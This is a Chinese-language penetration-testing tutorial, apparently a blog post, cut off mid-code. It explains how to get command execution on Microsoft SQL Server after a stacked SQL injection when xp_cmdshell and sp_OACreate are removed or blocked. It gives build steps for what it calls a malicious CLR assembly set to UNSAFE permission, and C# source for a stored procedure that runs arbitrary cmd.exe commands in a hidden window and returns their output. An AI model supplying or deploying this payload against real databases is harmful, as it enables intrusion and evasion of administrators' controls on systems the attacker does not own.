使用mssql中的clr程序集来执行命令
在我们拿到一个mssql的可堆叠注入时，可能第一时间想到的就是使用 `xp_cmdshell` 和 `sp_OACreate`
来执行命令、反弹shell等等，然而很多时候这两个存储过程不是被删就是被拦截，各种各样的因素导致我们不能执行系统命令，本文就来解决这个问题。
# 什么是CLR
CLR微软官方把他称为 **公共语言运行时** ，从 SQL Server 2005 开始，SQL Server 集成了用于 Microsoft
Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括
Microsoft Visual Basic .NET 和 Microsoft Visual
C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。
那么我们来使用C#来创建一个clr项目，在项目中我们创建一个存储过程调用cmd来执行命令。
# 制作恶意CLR
我在这里使用windows 2008、MSSQL2008r2和visual studio
2019来做演示。需要注意的是在MSSQL2008及以前的版本中是基于.net3.5运行的，不支持.net4.0+的CLR项目，需要将项目属性设置为.net3.5的，在这里踩了很大的坑。
创建MSSQL数据库项目
修改项目属性，勾上创建SQL文件
选.net3.5 来兼容旧版本MSSQL，权限级别要改为UNSAFE，因为我们要调用外部程序，必须设置为UNSAFE才可以。
保存后右键项目名字 新建项-创建存储过程
选择clr
然后修改代码，我贴上我的代码，注意类名和命名空间的修改
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Data.SqlTypes;
    using System.Diagnostics;
    using System.Text;
    using Microsoft.SqlServer.Server;
    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void ExecCommand (string cmd)
        {
            // 在此处放置代码
            SqlContext.Pipe.Send("Command is running, please wait.");
            SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
        }
        public static string RunCommand(string filename,string arguments)
        {
            var process = new Process();
            process.StartInfo.FileName = filename;
            if (!string.IsNullOrEmpty(arguments))
            {
                process.StartInfo.Arguments = arguments;
            }
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            var stdOutput = new StringBuilder();
            process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
            string stdError = null;
            try
            {
                process.Start();
                process.BeginOutputReadLine();
                stdError = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }
            if (process.ExitCode == 0)
            {
                SqlContext.Pipe.Send(stdOutput.ToString());